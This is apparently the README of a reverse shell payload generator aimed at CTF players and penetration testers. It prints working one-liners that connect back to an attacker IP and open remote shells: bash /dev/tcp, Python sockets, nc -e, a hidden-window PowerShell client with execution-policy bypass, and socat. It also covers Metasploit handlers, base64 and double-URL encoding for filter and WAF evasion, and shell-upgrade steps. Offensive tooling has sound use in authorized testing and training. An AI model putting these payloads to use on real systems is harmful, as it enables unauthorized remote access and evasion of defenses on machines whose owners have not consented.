# Reverse Shell Generator

<div align="center">

![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)
![License](https://img.shields.io/badge/license-Educational-green.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)
![Version](https://img.shields.io/badge/version-2.0-orange.svg)
![Status](https://img.shields.io/badge/status-Production%20Ready-brightgreen.svg)
![Downloads](https://img.shields.io/github/downloads/dustin04x/Reverse-Shell-Generator/total)


![GitHub](https://img.shields.io/badge/GitHub-dustin04x-blue?logo=github)
![Python](https://img.shields.io/badge/Made%20with-Python-yellow?logo=python)
![Security](https://img.shields.io/badge/Security-Educational-red?logo=security)
![CTF](https://img.shields.io/badge/Use%20Case-CTF%20%7C%20Pentesting-purple?logo=hackthebox)

**A comprehensive, user-friendly reverse shell payload generator supporting 20+ languages and platforms**


</div>

---

## 🎯 At a Glance

<div align="center">

| 🏷️ **21+** Shell Types | 🔐 **4** Encoding Options | 📋 **3** Platforms | 🎮 **Interactive** Mode |
|:---:|:---:|:---:|:---:|
| Linux, Windows, Web, Scripting | URL, Base64, Hex, Double URL | Windows, macOS, Linux | Menu-driven interface |
| ⚡ **Zero Dependencies** | 💾 **File Export** | 📋 **Clipboard** | ✅ **Validation** |

</div>

---

## ✨ Features Overview

<table>
<tr>
<td>

### 🎯 Interactive Mode
- **Menu-driven interface** with intuitive navigation
- **Easy shell selection** with categorized browsing
- **Post-generation options** (copy, encode, save)
- **Real-time IP/Port validation**
- **Change configuration** without restarting

</td>
<td>

### 📋 Clipboard Integration
- **One-click copy** functionality
- **Cross-platform support** (Windows, macOS, Linux)
- **Instant paste** on target systems
- **Save time** during engagements

</td>
</tr>
<tr>
<td>

### 🔐 Multiple Encodings
- **URL encoding** for web shells
- **Base64 encoding** for filter bypass
- **Hex encoding** for binary-safe transmission
- **Double URL encoding** for WAF bypass
- **Combined encoding** options

</td>
<td>

### 💾 File Export
- **Save individual payloads** to custom files
- **Export all shells** at once
- **Formatted output** with descriptions
- **Organized by categories**
- **Share with team members**

</td>
</tr>
<tr>
<td>

### 📚 Categorized Shells
- **🖥️ Linux Shells** (8 types): bash, nc, socat, telnet, awk
- **🐍 Scripting Languages** (7 types): Python, PHP, Perl, Ruby, Lua, Node.js
- **🪟 Windows** (3 types): PowerShell variants
- **⚡ Compiled Languages** (2 types): Java, Golang
- **🖼️ Other** (1 type): X11

</td>
<td>

### 🎨 Enhanced UX
- **Color-coded output** for better readability
- **Detailed descriptions** for each shell type
- **Input validation** with helpful error messages
- **Command-line shortcuts** for power users
- **Progressive disclosure** of advanced options

</td>
</tr>
</table>

---

## ⚡ Quick Start

### 📋 Requirements Checklist

<div align="center">

| ✅ Python 3.6+ | ✅ Internet (optional) | ✅ Clipboard Tools (optional) |
|:---:|:---:|:---:|
| Download from [python.org](https://python.org) | For Git clone only | Auto-installed on most systems |

</div>

### 🚀 Installation Steps

```bash
# Option 1: Clone the repository
git clone https://github.com/dustin04x/Reverse-Shell-Generator.git
cd Reverse-Shell-Generator

# Option 2: Download directly
wget https://github.com/dustin04x/Reverse-Shell-Generator/archive/main.zip
unzip main.zip && cd Reverse-Shell-Generator-main

# Option 3: Copy the script file directly
# Just download revshell.py to your preferred directory
```

### 🎮 First Run

```bash
# Launch interactive mode (recommended for beginners)
python revshell.py

# Or use command-line mode
python revshell.py <IP> <PORT> <SHELL_TYPE>
```

### 📋 Optional: Clipboard Setup

For **Linux** users, install clipboard tools:

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install xclip -y

# RHEL/CentOS/Fedora
sudo yum install xclip -y
# OR
sudo dnf install xclip -y

# Arch Linux
sudo pacman -S xclip
```

**Windows & macOS**: Clipboard support is built-in! No installation needed.

---

## 📖 Usage

### 🎮 Interactive Mode (Recommended)

**Launch the interactive menu:**

```bash
python revshell.py
```

**Available Options:**

<div align="center">

| 🔢 **Option** | 📝 **Description** | 🎯 **Best For** |
|:---:|:---|:---|
| **1** | Generate Specific Shell | When you know which shell you need |
| **2** | List All Shells | Browse all available options |
| **3** | List by Category | Filter by platform/language |
| **4** | Generate All Shells | Create comprehensive payload set |
| **5** | Change IP/Port | Update configuration |
| **6** | Exit | Clean exit |

</div>

**Post-Generation Actions:**

<div align="center">

| 🔧 **Key** | 📝 **Action** | 💡 **Use Case** |
|:---:|:---|:---|
| **`c`** | Copy to Clipboard | Quick paste on target |
| **`e`** | Encode Payload | Bypass filters/WAF |
| **`s`** | Save to File | Documentation/sharing |
| **`l`** | Show Listener | Setup listener commands |
| **Enter** | Return to Menu | Generate another payload |

</div>

### ⚡ Command-Line Mode

#### Basic Syntax

```bash
python revshell.py <IP> <PORT> <SHELL_TYPE> [OPTIONS]
```

#### 📊 Command-Line Options Reference

| 🔧 **Option** | 🔤 **Short** | 📝 **Description** | 💡 **Example** |
|:---:|:---:|:---|:---|
| `--interactive` | `-i` | Launch interactive mode | `python revshell.py -i` |
| `--list` | | List all available shell types | `python revshell.py --list` |
| `--list-categories` | | List shells organized by category | `python revshell.py --list-categories` |
| `--all` | | Generate all available shells | `python revshell.py 10.10.10.5 4444 --all` |
| `--encode <type>` | | Encode payload | `python revshell.py 10.10.10.5 4444 bash --encode url` |
| `--clipboard` | `-c` | Copy payload to clipboard | `python revshell.py 10.10.10.5 4444 python3 -c` |
| `--save <file>` | | Save payload to file | `python revshell.py 10.10.10.5 4444 bash --save payload.txt` |

---

## 💡 Examples

### 🎯 Quick Start Examples

<div align="center">

| 🎯 **Scenario** | 💻 **Command** | 📝 **Description** |
|:---|:---|:---|
| **🆕 First Time** | `python revshell.py` | Launch interactive mode |
| **🐧 Linux Target** | `python revshell.py 10.10.10.5 4444 bash` | Generate bash reverse shell |
| **🐍 Python Shell** | `python revshell.py 10.10.10.5 4444 python3 -c` | Generate Python3 with clipboard |
| **🌐 Web Shell** | `python revshell.py 10.10.10.5 4444 php --encode url` | Generate URL-encoded PHP |
| **📁 Save to File** | `python revshell.py 10.10.10.5 4444 bash --save shell.txt` | Save payload to file |
| **📋 List All** | `python revshell.py --list` | Browse available shells |

</div>

### 🔧 Advanced Examples

```bash
# Combine multiple options for complex scenarios
python revshell.py 10.10.10.5 4444 bash --encode url --clipboard --save encoded_payload.txt

# Generate PowerShell with base64 encoding
python revshell.py 192.168.1.100 9001 powershell --encode base64

# Quick generation for CTF competitions
python revshell.py 10.10.14.5 4444 python3 -c
# Just paste on target and you're done!

# Generate all shells for comprehensive testing
python revshell.py 10.10.10.5 4444 --all > all_payloads.txt
```

### 🔄 Workflow Examples

#### 🔴 Scenario 1: CTF Competition

```bash
# 1. Set up listener
nc -lvnp 4444

# 2. Generate payload and copy to clipboard
python revshell.py 10.10.14.5 4444 python3 -c

# 3. Execute on target
# (Payload is already in your clipboard!)

# 4. Upgrade shell once connected
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### 🔴 Scenario 2: Web Application Testing

```bash
# 1. Generate URL-encoded payload
python revshell.py 10.10.10.5 4444 php --encode url

# 2. Use in web parameters
# ?cmd=<URL_ENCODED_PAYLOAD>

# 3. Set up listener
nc -lvnp 4444
```

#### 🔴 Scenario 3: Windows Target

```bash
# 1. Generate PowerShell payload
python revshell.py 10.10.10.5 4444 powershell --encode base64

# 2. Copy to clipboard
python revshell.py 10.10.10.5 4444 powershell --clipboard

# 3. Execute in PowerShell on Windows target
# (Just paste and press Enter!)
```

---

## 🎯 Supported Shell Types

### 🖥️ Linux Shells

| 🐧 **Shell** | 📝 **Description** | 🎯 **Use Case** | ⭐ **Reliability** |
|:---:|:---|:---|:---:|
| `bash` | Standard bash reverse shell using /dev/tcp | Most common Linux targets | ⭐⭐⭐⭐⭐ |
| `bash_tcp` | Alternative bash TCP reverse shell | Restricted environments | ⭐⭐⭐⭐ |
| `bash_udp` | Bash UDP reverse shell | UDP-based scenarios | ⭐⭐⭐ |
| `nc` | Traditional netcat with -e flag | Systems with netcat | ⭐⭐⭐⭐⭐ |
| `nc_openbsd` | Netcat for OpenBSD (no -e flag) | OpenBSD systems | ⭐⭐⭐⭐ |
| `socat` | Socat reverse shell (very stable) | High-stability connections | ⭐⭐⭐⭐⭐ |
| `telnet` | Telnet-based reverse shell | Legacy systems | ⭐⭐⭐ |
| `awk` | AWK-based reverse shell | Minimal environments | ⭐⭐ |

### 🐍 Scripting Languages

| 🐍 **Shell** | 📝 **Description** | 🎯 **Use Case** | ⭐ **Reliability** |
|:---:|:---|:---|:---:|
| `python` | Python 2 reverse shell | Legacy Python systems | ⭐⭐⭐⭐ |
| `python3` | Python 3 reverse shell with PTY | Modern Python systems | ⭐⭐⭐⭐⭐ |
| `perl` | Perl socket-based reverse shell | Perl-enabled systems | ⭐⭐⭐⭐ |
| `php` | PHP reverse shell using fsockopen | Web applications | ⭐⭐⭐⭐ |
| `ruby` | Ruby TCP socket reverse shell | Ruby on Rails apps | ⭐⭐⭐⭐ |
| `lua` | Lua socket reverse shell | Lua-enabled systems | ⭐⭐⭐ |
| `nodejs` | Node.js net module reverse shell | Node.js applications | ⭐⭐⭐⭐ |

### 🪟 Windows

| 🪟 **Shell** | 📝 **Description** | 🎯 **Use Case** | ⭐ **Reliability** |
|:---:|:---|:---|:---:|
| `powershell` | PowerShell TCP client reverse shell | Windows PowerShell | ⭐⭐⭐⭐⭐ |
| `powershell_base64` | PowerShell base64 encoded payload | Bypass security filters | ⭐⭐⭐⭐ |
| `powershell_encoded` | PowerShell with full encoding | Advanced bypass scenarios | ⭐⭐⭐ |

### ⚡ Compiled Languages

| ⚡ **Shell** | 📝 **Description** | 🎯 **Use Case** | ⭐ **Reliability** |
|:---:|:---|:---|:---:|
| `java` | Java Runtime.exec reverse shell | Java-enabled systems | ⭐⭐⭐ |
| `golang` | Golang reverse shell (requires compilation) | Go environments | ⭐⭐⭐ |

### 🖼️ Other

| 🖼️ **Shell** | 📝 **Description** | 🎯 **Use Case** | ⭐ **Reliability** |
|:---:|:---|:---|:---:|
| `xterm` | X11 xterm reverse shell | X11-enabled systems | ⭐⭐ |

---

## 🔐 Encoding Options

### 🌐 URL Encoding

**Perfect for web shells and URL parameters:**

```bash
python revshell.py 10.10.10.5 4444 bash --encode url
# Output: bash%20-i%20%3E%26%20/dev/tcp/10.10.10.5/4444%200%3E%261
```

<div align="center">

| 🎯 **Use Case** | 💡 **Example** | 🔧 **Why URL Encode** |
|:---|:---|:---|
| Web parameter injection | `?cmd=<encoded_payload>` | Prevents parameter corruption |
| GET request payloads | `curl "http://target?cmd=<encoded>"` | URL-safe transmission |
| Web shell commands | Input field: `<encoded_payload>` | Bypass basic filters |

</div>

### 🔢 Base64 Encoding

**Useful for bypassing character filters:**

```bash
python revshell.py 10.10.10.5 4444 bash --encode base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQ==
```

<div align="center">

| 🎯 **Use Case** | 💡 **Example** | 🔧 **Why Base64** |
|:---|:---|:---|
| Command injection | `echo <base64> | base64 -d | bash` | Obfuscate payloads |
| Filter bypass | Use in parameter values | Avoids character restrictions |
| Data transmission | Binary-safe encoding | Reliable payload delivery |

</div>

### 🔢 Hex Encoding

**For binary-safe transmission:**

```bash
python revshell.py 10.10.10.5 4444 bash --encode hex
# Output: \x62\x61\x73\x68\x20\x2d\x69...
```

<div align="center">

| 🎯 **Use Case** | 💡 **Example** | 🔧 **Why Hex** |
|:---|:---|:---|
| Binary protocols | Network packet injection | Binary-safe format |
| Shellcode integration | Exploit development | Low-level compatibility |
| Low-level exploitation | Buffer overflow attacks | Memory-safe encoding |

</div>

### 🔄 Double URL Encoding

**For double-encoded scenarios:**

```bash
python revshell.py 10.10.10.5 4444 bash --encode double_url
```

<div align="center">

| 🎯 **Use Case** | 💡 **Example** | 🔧 **Why Double Encode** |
|:---|:---|:---|
| WAF bypass | Web Application Firewalls | Multiple encoding layers |
| Double-decoding vulns | Multiple decode processes | Exploit decoder bugs |
| Complex web apps | Multi-tier applications | Advanced bypass techniques |

</div>

---

## 🎧 Setting Up a Listener

<div align="center">

⚠️ **IMPORTANT**: Always set up your listener BEFORE executing the reverse shell!

</div>

### 📡 Netcat (Most Common)

```bash
# Basic listener
nc -lvnp 4444

# With verbose output
nc -lvnp 4444 -v

# With specific interface
nc -lvnp 4444 -l 0.0.0.0
```

### 🔧 Socat (More Stable)

```bash
# Interactive TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444

# With process spawning
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:4444
```

### 🛡️ Metasploit (Advanced)

```bash
# Quick listener
msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; exploit"

# With advanced options
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; set ExitOnSession false; exploit -j"
```

### 🚀 Pwncat (Modern Alternative)

```bash
# Basic listener
pwncat-cs -l 4444

# With elevated privileges
pwncat-cs -l 4444 --py

# With SSL (production)
pwncat-cs -l 4444 --ssl
```

---

## ⬆️ Upgrading Your Shell

<div align="center">

🎯 **Goal**: Transform basic shell into fully interactive TTY

</div>

### 🐍 Method 1: Python PTY (Recommended)

```bash
# Step 1: On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Press Ctrl+Z to background the shell

# Step 3: On your machine
stty raw -echo; fg

# Step 4: Press Enter twice

# Step 5: On victim machine (optional)
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal size
```

### 📜 Method 2: Script Command

```bash
# Quick upgrade
script /dev/null -c bash

# With specific shell
script /dev/null -c /bin/zsh
```

### 🔗 Method 3: Socat Upgrade

```bash
# On your machine (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.5:4444
```

### 👁️ Method 4: Expect

```bash
# Install expect if not available
# Debian/Ubuntu: sudo apt install expect
expect -c 'spawn /bin/bash; interact'
```

---

## 📚 Reverse Shell Cheatsheet

<div align="center">

> 📄 **[📋 View Complete Standalone Cheatsheet →](CHEATSHEET.md)**

**The comprehensive reference guide for all your reverse shell needs!**

</div>

### 🚀 Quick Reference (Most Common)

<div align="center">

| 🐧 **Linux** | 🐍 **Python** | 📡 **Netcat** | 🪟 **PowerShell** |
|:---:|:---:|:---:|:---:|
| `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1` | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` | `nc -e /bin/sh 10.10.10.5 4444` | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("10.10.10.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` |

</div>

### 📁 What's in the Cheatsheet

<div align="center">

| 📋 **Section** | 📝 **Content** | 🎯 **Use Case** |
|:---|:---|:---|
| **🚀 Quick Shells** | Most common reverse shells | Fast deployment |
| **🔐 Encoding Guide** | Base64, URL, Hex encoding | Filter bypass |
| **⬆️ Shell Upgrades** | PTY, socat, expect methods | Interactive sessions |
| **📁 File Transfer** | HTTP servers, wget, curl | Post-exploitation |
| **🌉 Port Forwarding** | SSH, Chisel, proxy chains | Network pivoting |
| **💾 Persistence** | Cron, SSH keys, systemd | Long-term access |
| **🛠️ Troubleshooting** | Common issues & solutions | Problem resolution |

</div>

---

## 🎯 Shell Selection Guide

<div align="center">

**🎯 Choose the right shell for your target environment**

</div>

### 🐧 For Linux Targets

<div align="center">

| 🎯 **Priority** | 🐧 **Shell Type** | 📝 **Reason** | ⚡ **Quick Command** |
|:---:|:---:|:---|:---|
| **🥇 1st Choice** | `bash` | Most reliable, works everywhere | `python revshell.py <IP> <PORT> bash` |
| **🥈 2nd Choice** | `python3` | Great for TTY upgrades | `python revshell.py <IP> <PORT> python3` |
| **🥉 3rd Choice** | `nc` | Classic, requires netcat | `python revshell.py <IP> <PORT> nc` |
| **🏆 Best Stability** | `socat` | Most stable if available | `python revshell.py <IP> <PORT> socat` |

</div>

### 🪟 For Windows Targets

<div align="center">

| 🎯 **Priority** | 🪟 **Shell Type** | 📝 **Reason** | ⚡ **Quick Command** |
|:---:|:---:|:---|:---|
| **🥇 1st Choice** | `powershell` | Standard, reliable | `python revshell.py <IP> <PORT> powershell` |
| **🥈 2nd Choice** | `powershell_base64` | Better for bypass | `python revshell.py <IP> <PORT> powershell_base64` |
| **🥉 3rd Choice** | `powershell_encoded` | Advanced scenarios | `python revshell.py <IP> <PORT> powershell_encoded` |

</div>

### 🌐 For Web Applications

<div align="center">

| 🌐 **Technology** | 🐍 **Shell Type** | 📝 **Reason** | ⚡ **Quick Command** |
|:---:|:---:|:---|:---|
| **PHP** | `php` | Perfect for PHP apps | `python revshell.py <IP> <PORT> php` |
| **Node.js** | `nodejs` | For JS backends | `python revshell.py <IP> <PORT> nodejs` |
| **Python** | `python3` | Many web frameworks | `python revshell.py <IP> <PORT> python3` |
| **Ruby** | `ruby` | Ruby on Rails | `python revshell.py <IP> <PORT> ruby` |

</div>

### 🔒 For Restricted Environments

<div align="center">

| 🔒 **Restriction** | 🎯 **Alternative** | 📝 **Why It Works** | ⚡ **Quick Command** |
|:---:|:---:|:---|:---|
| **No bash** | `perl` | Often available | `python revshell.py <IP> <PORT> perl` |
| **No netcat** | `python3` | Built-in interpreter | `python revshell.py <IP> <PORT> python3` |
| **Minimal tools** | `awk` | Usually present | `python revshell.py <IP> <PORT> awk` |
| **Alternative bash** | `bash_tcp` | Different syntax | `python revshell.py <IP> <PORT> bash_tcp` |

</div>

---

## 💡 Pro Tips & Best Practices

<div align="center">

🚀 **Level up your reverse shell game with these expert tips**

</div>

### 🎯 1. Master Interactive Mode

**When you're exploring or unsure which shell to use:**

```bash
python revshell.py
# Select option 3: "List by Category"
# Browse shells organized by platform
```

**💡 Why**: Interactive mode shows descriptions and helps you learn.

### 🎯 2. Combine Multiple Options

```bash
python revshell.py 10.10.10.5 4444 bash --encode url --save payload.txt --clipboard
```

**🎯 What this does**:
- ✅ Generates bash shell
- ✅ URL encodes for web use
- ✅ Saves to file for documentation
- ✅ Copies to clipboard for instant use

### 🎯 3. Quick Reference Commands

```bash
# See all available shells
python revshell.py --list

# Browse by platform
python revshell.py --list-categories

# Generate comprehensive set
python revshell.py 10.10.10.5 4444 --all > all_payloads.txt
```

### 🎯 4. Always Validate Before Use

**The tool automatically validates**:
- ✅ IP address format (IPv4)
- ✅ Port range (1-65535)
- ✅ Shell type existence

**💡 Tip**: Trust the validation - it prevents common mistakes.

### 🎯 5. Use Clipboard for Speed

```bash
python revshell.py 10.10.10.5 4444 python3 -c
# Payload is instantly ready to paste!
```

**🚀 Perfect for CTFs** where speed matters.

### 🎯 6. Document Your Payloads

```bash
# Save with descriptive names
python revshell.py 10.10.10.5 4444 bash --save "linux_bash_4444.txt"
python revshell.py 10.10.10.5 4444 php --save "web_php_4444.txt"

# Generate comprehensive documentation
python revshell.py 10.10.10.5 4444 --all > "all_shells_$(date +%Y%m%d).txt"
```

---

## 🛠️ Troubleshooting

<div align="center">

🔧 **Common Issues & Quick Solutions**

</div>

### ❌ "Invalid IP address format"

<div align="center">

| ✅ **Correct Format** | ❌ **Incorrect** | 🔧 **Fix** |
|:---:|:---:|:---|
| `192.168.1.100` | `192.168.1` | Add missing octet |
| `10.10.10.5` | `10.10.10` | Complete the IP |
| `172.16.0.1` | `172.16.0` | Ensure 4 octets |

</div>

**🔧 Solutions**:
- Use valid IPv4 format (x.x.x.x)
- Check for typos in IP address
- Ensure all 4 octets are present
- Validate IP is reachable

### ❌ "Invalid port"

<div align="center">

| ✅ **Valid Range** | ❌ **Invalid** | 🔧 **Common Ports** |
|:---:|:---:|:---|
| 1-65535 | 0, 65536 | 4444, 9001, 1337, 8080 |

</div>

**🔧 Solutions**:
- Port must be between 1 and 65535
- Common CTF ports: 4444, 9001, 1337
- Avoid well-known ports: 22, 80, 443
- Check if port is already in use

### 📋 Clipboard Not Working?

<div align="center">

| 🖥️ **Platform** | ✅ **Built-in** | 🔧 **Install If Needed** |
|:---:|:---:|:---|
| **Windows** | `clip` command | ✅ Already available |
| **macOS** | `pbcopy` command | ✅ Already available |
| **Linux** | Requires tools | `sudo apt install xclip` |

</div>

**🔧 Linux Installation**:

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install xclip -y

# RHEL/CentOS/Fedora
sudo yum install xclip -y
# OR
sudo dnf install xclip -y

# Arch Linux
sudo pacman -S xclip
```

### 💀 Shell Dies Immediately?

<div align="center">

| 🔍 **Check** | ✅ **Verify** | 🔧 **Solution** |
|:---:|:---:|:---|
| **Firewall** | Both machines allow connection | Check firewall rules |
| **IP/Port** | Correct and reachable | Validate configuration |
| **Listener** | Active and listening | `netstat -tulpn \| grep :4444` |
| **Shell Type** | Compatible with target | Try different shell |

</div>

**🔧 Debugging Steps**:

```bash
# 1. Verify listener is running
netstat -tulpn | grep :4444
# OR
ss -tulpn | grep :4444

# 2. Test network connectivity
ping <target_ip>
telnet <target_ip> 4444

# 3. Try different shell types
python revshell.py <IP> <PORT> bash
python revshell.py <IP> <PORT> python3
python revshell.py <IP> <PORT> socat
```

### 🖥️ No Interactive Shell?

<div align="center">

| 🚀 **Method** | 📝 **Command** | ⭐ **Success Rate** |
|:---:|:---|:---:|
| **Python PTY** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | ⭐⭐⭐⭐⭐ |
| **Script** | `script /dev/null -c bash` | ⭐⭐⭐⭐ |
| **Expect** | `expect -c 'spawn /bin/bash; interact'` | ⭐⭐⭐ |
| **Socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` | ⭐⭐⭐⭐⭐ |

</div>

**🔧 Quick Fix**:

```bash
# On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z

# On your machine
stty raw -echo; fg
# Press Enter twice
```

---

## 🔒 Security Notice

<div align="center">

⚠️ **CRITICAL: Read Before Use**

</div>

> [!CAUTION]
> **This tool is for educational purposes and authorized penetration testing only.**

### ✅ Legal Requirements

<div align="center">

| ✅ **You MUST Have** | 📝 **Description** |
|:---|:---|
| **📜 Written Authorization** | Explicit permission from system owner |
| **🎯 Proper Scope** | Defined testing boundaries |
| **⚖️ Legal Permission** | Compliance with local laws |
| **📋 Documentation** | Record of authorized activities |

</div>

### ❌ Never Use On

<div align="center">

| ❌ **Prohibited Targets** | ⚠️ **Consequences** |
|:---|:---|
| **Systems you don't own** | Legal prosecution |
| **Unauthorized systems** | Criminal charges |
| **Production systems** | Service disruption |
| **Government systems** | National security violations |

</div>

### 🛡️ Responsible Use Guidelines

<div align="center">

| 🛡️ **Best Practice** | 📝 **Description** |
|:---:|:---|
| **📢 Responsible Disclosure** | Report vulnerabilities ethically |
| **📝 Document Activities** | Maintain detailed logs |
| **🧹 Clean Up** | Remove persistence mechanisms |
| **🔒 Use Encryption** | Secure channels in production |
| **🤝 Respect Privacy** | Protect user data and privacy |

</div>

### 📜 Disclaimer

**The author is not responsible for misuse of this tool.**

- Unauthorized access to computer systems is illegal
- Use only in authorized testing environments
- This tool is provided for educational purposes
- You are responsible for compliance with all applicable laws

---

## 📊 Statistics & Metrics

<div align="center">

| 📈 **Metric** | 📊 **Value** | 📝 **Description** |
|:---:|:---:|:---|
| **🏷️ Shell Types** | **21+** | Total supported reverse shells |
| **🔐 Encoding Options** | **4** | URL, Base64, Hex, Double URL |
| **📂 Categories** | **5** | Linux, Windows, Scripting, Compiled, Other |
| **💻 Lines of Code** | **~450** | Well-structured Python code |
| **📦 Dependencies** | **0** | Pure Python, no external libs |
| **🖥️ Platforms** | **3** | Windows, macOS, Linux |
| **🎮 Modes** | **2** | Interactive and Command-line |
| **📋 Features** | **10+** | Copy, encode, save, validate, etc. |

</div>

---

## 🆕 What's New in v2.0

<div align="center">

🚀 **Major Release - Enhanced Features & Better UX**

</div>

### ✨ New Features

<div align="center">

| 🆕 **Feature** | 📝 **Description** | 🎯 **Benefit** |
|:---:|:---|:---|
| **🎮 Interactive Mode** | Menu-driven interface | Easy for beginners |
| **📋 Clipboard Integration** | One-click copy functionality | Faster deployments |
| **🔐 Multiple Encodings** | URL, Base64, Hex, Double URL | Bypass restrictions |
| **💾 File Export** | Save individual or all payloads | Documentation & sharing |
| **📂 Categorized Browsing** | Organized by platform/language | Better organization |
| **✅ IP/Port Validation** | Real-time input validation | Prevent errors |
| **📝 Detailed Descriptions** | Each shell explained | Educational value |
| **🎨 Enhanced UI** | Better colors and formatting | Improved readability |
| **⚡ Command Shortcuts** | CLI power user features | Faster workflows |
| **📚 Comprehensive Docs** | Better documentation | Easier to learn |

</div>

### 🔧 Technical Improvements

<div align="center">

| 🔧 **Improvement** | 📝 **Description** | 🎯 **Benefit** |
|:---:|:---|:---|
| **📝 Type Hints** | Better code clarity | Maintainability |
| **✅ Validation Methods** | IP and port checking | Error prevention |
| **🔧 Helper Functions** | Encoding and clipboard utilities | Code reusability |
| **🛡️ Error Handling** | Comprehensive exception management | User-friendly errors |
| **🏗️ Code Structure** | Organized and modular | Easy to extend |
| **📚 Documentation** | Inline comments and docstrings | Developer friendly |

</div>

---

## 🎓 Educational Resources

<div align="center">

📚 **Continue Learning - Expand Your Knowledge**

</div>

### 🎯 Recommended Learning Path

<div align="center">

| 📚 **Step** | 🎯 **Focus** | 📝 **Action** |
|:---:|:---|:---|
| **1️⃣** | **Shell Basics** | Master bash shells |
| **2️⃣** | **TTY Upgrades** | Learn Python PTY methods |
| **3️⃣** | **Filter Bypass** | Practice encoding techniques |
| **4️⃣** | **Persistence** | Study persistence mechanisms |
| **5️⃣** | **CTF Practice** | Apply in safe environments |

</div>

### 📖 External Resources

<div align="center">

| 📚 **Resource** | 🔗 **Link** | 📝 **Description** |
|:---:|:---|:---|
| **PayloadsAllTheThings** | [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) | Comprehensive reverse shell collection |
| **PentestMonkey** | [Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) | Classic reverse shell techniques |
| **HackTricks** | [Shells Guide](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells) | Advanced shell techniques |
| **OWASP** | [Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) | Web application security testing |

</div>

---

## 🤝 Contributing

<div align="center">

🌟 **Help Improve This Tool - Community Driven**

</div>

### 🎯 How to Contribute

<div align="center">

| 🤝 **Contribution Type** | 📝 **Description** | 🔧 **How to Help** |
|:---:|:---|:---|
| **🐛 Bug Reports** | Found a bug or issue | Open an issue with details |
| **💡 Feature Requests** | New shell types or features | Suggest improvements |
| **📚 Documentation** | Improve guides and examples | Submit documentation updates |
| **💻 Code Contributions** | Fix bugs or add features | Submit pull requests |
| **🧪 Testing** | Test on different platforms | Report compatibility issues |

</div>

### 📋 Contribution Guidelines

```bash
# 1. Fork the repository
git clone https://github.com/dustin04x/Reverse-Shell-Generator.git
cd Reverse-Shell-Generator

# 2. Create a feature branch
git checkout -b feature/amazing-new-feature

# 3. Make your changes
# Edit files, add tests, update documentation

# 4. Test your changes
python revshell.py --list  # Verify functionality

# 5. Commit and push
git commit -m "Add amazing new feature"
git push origin feature/amazing-new-feature

# 6. Submit pull request
# Open on GitHub with detailed description
```

### 🎯 Areas for Improvement

<div align="center">

| 🎯 **Area** | 📝 **Description** | 🚀 **Impact** |
|:---:|:---|:---:|
| **New Shell Types** | Add more reverse shell variants | Broader compatibility |
| **Platform Support** | Extend to more operating systems | Increased usability |
| **Encoding Methods** | Additional obfuscation techniques | Better bypass capabilities |
| **Interactive Features** | Enhanced menu system | Better user experience |
| **Documentation** | More examples and tutorials | Easier learning |

</div>

---

## 📄 License

<div align="center">

📜 **Educational Use Only License**

</div>

**This tool is provided for educational purposes and authorized security testing.**

### ✅ Permitted Uses
- Educational purposes and learning
- Authorized penetration testing
- Security research in controlled environments
- CTF competitions and training

### ❌ Prohibited Uses
- Unauthorized system access
- Malicious activities
- Illegal hacking attempts
- Production system interference

**By using this tool, you agree to use it responsibly and in compliance with all applicable laws.**

---

## 🙏 Acknowledgments

<div align="center">

❤️ **Built for the Cybersecurity Community**

</div>

### 📚 Inspiration Sources

<div align="center">

| 📚 **Source** | 🙏 **Contribution** |
|:---|:---|
| **PayloadsAllTheThings** | Comprehensive payload collections |
| **PentestMonkey** | Classic reverse shell techniques |
| **HackTricks** | Advanced exploitation methods |
| **Security Community** | Feedback and contributions |
| **CTF Players** | Real-world testing scenarios |

</div>

### 🎯 Purpose

<div align="center">

**This tool was created to:**
- 📚 **Educate** cybersecurity professionals
- 🚀 **Streamline** penetration testing workflows
- 🤝 **Unite** the security community
- 📋 **Provide** comprehensive resources
- 🛡️ **Promote** ethical hacking practices

</div>

---

<div align="center">

## 🎉 Thank You!

**Made with ❤️ for the cybersecurity community**

![GitHub](https://img.shields.io/badge/GitHub-dustin04x-blue?logo=github)
